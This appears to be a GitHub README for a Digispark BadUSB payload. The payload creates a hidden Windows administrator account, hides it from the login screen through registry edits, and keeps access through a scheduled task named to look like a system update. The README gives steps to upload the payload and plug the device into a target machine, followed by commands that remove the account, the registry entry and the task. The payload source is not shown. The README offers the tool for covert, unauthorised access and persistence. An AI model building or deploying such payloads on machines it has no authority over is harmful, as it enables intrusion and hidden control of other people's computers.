# Automated Digispark Payload for Guest Admin Creation

## Overview
This repository contains a Digispark BadUSB payload designed to create a hidden guest administrator account on Windows machines. The script executes commands to add a new user with administrative privileges while modifying system settings to maintain stealth and persistence.

## Features
- Creates a new administrator account using `net user` and `net localgroup` commands.
- Hides the account from the login screen by modifying registry values.
- Ensures persistence by adding scheduled tasks and adjusting local group policies.
- Executes stealthily to avoid detection by basic security measures.

## Prerequisites
- A **Digispark ATTiny85** microcontroller
- **Windows 10/11** target machine
- Digispark-compatible **Arduino IDE** with **DigiKeyboard** library installed

## Installation & Usage
1. Clone this repository or download the payload script.
   ```sh
   git clone https://github.com/varun2864/Digispark-GuestAdmin-Payload.git
   cd Digispark-GuestAdmin-Payload

2. Open the script in the Arduino IDE and upload it to the Digispark device.
3. Insert the Digispark into the target machine’s USB port.
4. The payload will automatically execute and create the hidden admin account.

To detect and remove the hidden guest admin account, run: net user GuestAdmin /delete
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v GuestAdmin /f
schtasks /delete /tn "SystemUpdate" /f
